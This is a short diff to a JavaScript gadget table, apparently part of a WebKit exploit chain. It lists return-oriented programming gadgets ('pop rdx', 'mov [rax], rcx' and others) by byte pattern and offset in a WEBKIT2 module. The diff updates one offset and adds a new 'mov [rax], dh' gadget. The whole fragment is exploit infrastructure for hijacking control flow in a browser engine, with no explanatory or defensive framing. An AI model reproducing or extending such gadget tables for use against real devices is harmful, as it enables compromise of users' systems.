@@ -2,7 +2,7 @@ var gadgets = {
 	"pop rbp": new gadget([0x5d], WEBKIT2, 0xb5d6d),
 	"pop rax": new gadget([0x58], WEBKIT2, 0x3352d),
 	"pop rcx": new gadget([0x59], WEBKIT2, 0x2bec0d),
-	"pop rdx": new gadget([0x5a, 0xff, 0xc5], WEBKIT2, 0x3bbf9e),
+	"pop rdx": new gadget([0x5a, 0xff, 0xc5], WEBKIT2, 0x250df2),
 	"pop rsi": new gadget([0x5e], WEBKIT2, 0x3914ca),
 	"pop rdi": new gadget([0x5f], WEBKIT2, 0x137cbd),
 	"pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xb854d),
@@ -18,6 +18,8 @@ var gadgets = {
 	"mov [rax], rcx": new gadget([0x48, 0x89, 0x08], WEBKIT2, 0x9ecde6),
 	"mov [rax], rdx": new gadget([0x48, 0x89, 0x10], WEBKIT2, 0x3579c0),
 	"mov [rax], rsi": new gadget([0x48, 0x89, 0x30], WEBKIT2, 0x2adea7),
+	
+	"mov [rax], dh": new gadget([], WEBKIT2, 0x142a68),
 	
 	"mov [rcx], rax": new gadget([0x48, 0x89, 0x01], WEBKIT2, 0xc320),
 	"mov [rcx], rdx": new gadget([0x48, 0x89, 0x11], 12, 0x5b00),
